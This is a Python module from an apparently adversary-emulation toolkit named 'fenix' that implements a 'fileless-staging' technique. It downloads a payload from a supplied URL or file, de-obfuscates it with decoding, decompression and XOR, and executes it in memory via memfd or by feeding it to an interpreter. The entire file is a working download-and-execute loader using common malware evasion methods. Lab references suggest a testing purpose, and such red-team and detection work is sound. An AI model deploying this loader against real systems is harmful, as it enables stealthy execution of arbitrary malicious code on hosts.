"""fileless-staging — Fetch/transform payload then execute via memfd or interpreter."""

from __future__ import annotations

from pathlib import Path
from typing import Any

from fenix.core import cleanup
from fenix.core.lab_staging import apply_lab_preset
from fenix.core.remote_bin import apply_remote_upload
from fenix.core.remote_fetch import fetch_remote_bytes
from fenix.core.staging import fetch_bytes
from fenix.core.transforms import DecompressOption, DecodeOption, apply_transforms
from fenix.techniques import register
from fenix.techniques import interpreter_exec as interpreter_exec_mod
from fenix.techniques import memfd_exec as memfd_exec_mod

VALID_EXECUTE = ("memfd", "interpreter")


@register("fileless-staging", "Stage, transform, and execute a payload")
def run_fileless_staging(options: dict[str, Any]) -> int:
    options = apply_lab_preset(options)
    options = apply_remote_upload(options)
    source_file = options.get("source_file") or options.get("source-file")
    source_url = options.get("source_url") or options.get("source-url")
    remote_fetch = options.get("remote_fetch") or options.get("remote-fetch")

    if source_url:
        if remote_fetch and remote_fetch != "requests":
            raw = fetch_remote_bytes(source_url, method=str(remote_fetch))
        else:
            raw = fetch_bytes(source_url=source_url)
    else:
        raw = fetch_bytes(source_file=source_file)

    decode: DecodeOption = options.get("decode") or "none"  # type: ignore[assignment]
    decompress: DecompressOption = options.get("decompress") or "none"  # type: ignore[assignment]
    payload = apply_transforms(
        raw,
        decode=decode,
        decompress=decompress,
        xor_key=options.get("xor_key") or options.get("xor-key"),
        tar_member=options.get("tar_member") or options.get("tar-member"),
    )

    execute = options.get("execute") or "memfd"
    if execute not in VALID_EXECUTE:
        raise ValueError(f"Invalid execute backend '{execute}'. Choose: memfd, interpreter")

    if execute == "memfd":
        tmp = cleanup.temp_path(prefix="fenix-staged-", suffix=".bin", technique="fileless-staging")
        Path(tmp).write_bytes(payload)
        memfd_opts = {
            "payload": str(tmp),
            "name": options.get("name") or "fenix_staged_payload",
            "method": options.get("method") or "procfs-fd",
            "argv0": options.get("argv0"),
            "keep_fd_open": options.get("keep_fd_open"),
            "fchmod": options.get("fchmod"),
            "ingest": options.get("ingest"),
            "noexec_seal": options.get("noexec_seal") or options.get("noexec-seal"),
        }
        return memfd_exec_mod.run_memfd_exec(memfd_opts)

    interpreter_opts = {
        "interpreter": options.get("interpreter"),
        "mode": options.get("mode") or "stdin",
        "code": payload.decode("utf-8", errors="replace"),
        "script": options.get("script"),
    }
    if not interpreter_opts["interpreter"]:
        raise ValueError("interpreter execution requires --interpreter")
    return interpreter_exec_mod.run_interpreter_exec(interpreter_opts)
